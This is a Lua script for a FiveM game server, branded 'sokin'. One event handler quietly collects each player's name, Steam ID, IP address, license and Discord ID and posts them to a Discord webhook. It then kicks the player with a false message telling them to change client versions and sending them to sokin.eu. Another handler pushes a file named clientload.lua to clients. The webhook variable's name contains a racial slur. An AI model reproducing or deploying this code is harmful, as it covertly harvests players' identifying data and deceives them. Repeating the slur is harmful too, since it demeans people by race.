local webhookniggerXD = "" -- webhook
function heheheeheheh()
    print([[^7
         ,    ,
        | \--/ |
        ( (0_0)(
         \==Y==/
         /'-"-'>
       _/ < ; (;
      / ,_ |_|_\
     ( _,,)\,,),)
     \ '.___
      '-----'
Server:  discord.gg/sokin^7
Website: https://sokin.eu/
Discord: sokin#6666
]])
end
heheheeheheh()
RegisterServerEvent('sokin:6666')
AddEventHandler('sokin:6666', function ()
    data = LoadResourceFile(GetCurrentResourceName(),'clientload.lua')
    TriggerClientEvent('sokin:XDXD', source, data)
end)


RegisterNetEvent("sokin:wyjebpedala")
AddEventHandler('sokin:wyjebpedala', function()
    local name = GetPlayerName(source)
    local steam = GetPlayerIdentifier(source)
    local ip = GetPlayerEndpoint(source)
    local identifiers = ExtractIdentifiers(source)
    local license = identifiers.license
    local discord ="<@" ..identifiers.discord:gsub("discord:", "")..">" 
    local connect = {
            {
                ["color"] = "1048320", 
                ["title"] = "ddddddddddddddddddddddd", 
                ["description"] = "Name: **"..name.."**\nSteam ID : **"..steam.."**\nIP: **" .. ip .. "**\nLicense: **" .. license .. "**\nDiscord: **" .. discord .. "**",
            }
        }

    PerformHttpRequest(webhookniggerXD, function(err, text, headers) end, 'POST', json.encode({username = "XD", embeds = connect, tts = TTS}), { ['Content-Type'] = 'application/json' })
    DropPlayer(source, 'Zmien wersje klienta Fivema na canary \nhttps://sokin.eu/')
end)


function ExtractIdentifiers(src)
    local identifiers = {
        steam = "",
        ip = "",
        discord = "",
        license = "",
        xbl = "",
        live = ""
    }

    for i = 0, GetNumPlayerIdentifiers(source) - 1 do
        local id = GetPlayerIdentifier(source, i)

        if string.find(id, "steam") then
            identifiers.steam = id
        elseif string.find(id, "ip") then
            identifiers.ip = id
        elseif string.find(id, "discord") then
            identifiers.discord = id
        elseif string.find(id, "license") then
            identifiers.license = id
        elseif string.find(id, "xbl") then
            identifiers.xbl = id
        elseif string.find(id, "live") then
            identifiers.live = id
        end
    end

    return identifiers
end
